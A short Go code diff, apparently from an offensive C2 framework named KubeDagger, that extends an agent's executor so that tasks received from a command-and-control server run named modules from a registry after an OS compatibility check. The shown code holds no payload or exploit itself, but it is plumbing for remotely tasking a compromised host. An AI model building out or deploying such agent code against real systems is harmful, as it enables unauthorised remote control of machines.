@@ -8,6 +8,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/yasindce1998/KubeDagger/pkg/agent/modules"
 	"github.com/yasindce1998/KubeDagger/pkg/c2server"
 )
 
@@ -15,10 +16,14 @@ const (
 	DefaultExecTimeout = 120 * time.Second
 )
 
-type Executor struct{}
+type Executor struct {
+	modules *modules.Registry
+}
 
 func NewExecutor() *Executor {
-	return &Executor{}
+	return &Executor{
+		modules: modules.NewRegistry(),
+	}
 }
 
 func (e *Executor) Execute(ctx context.Context, task *c2server.TaskResponse) (string, error) {
@@ -77,7 +82,32 @@ func (e *Executor) execModule(ctx context.Context, payload map[string]string) (s
 	if name == "" {
 		return "", fmt.Errorf("missing module name")
 	}
-	return "", fmt.Errorf("module %q not loaded", name)
+
+	mod, ok := e.modules.Get(name)
+	if !ok {
+		available := e.modules.List()
+		return "", fmt.Errorf("module %q not found (available: %s)", name, strings.Join(available, ", "))
+	}
+
+	supported := false
+	for _, p := range mod.Platform() {
+		if p == runtime.GOOS {
+			supported = true
+			break
+		}
+	}
+	if !supported {
+		return "", fmt.Errorf("module %q does not support %s", name, runtime.GOOS)
+	}
+
+	result, err := mod.Execute(ctx, payload)
+	if err != nil {
+		return "", err
+	}
+	if !result.Success {
+		return result.Output, fmt.Errorf("module failed: %s", result.Error)
+	}
+	return result.Output, nil
 }
 
 func (e *Executor) execConfig(payload map[string]string) (string, error) {
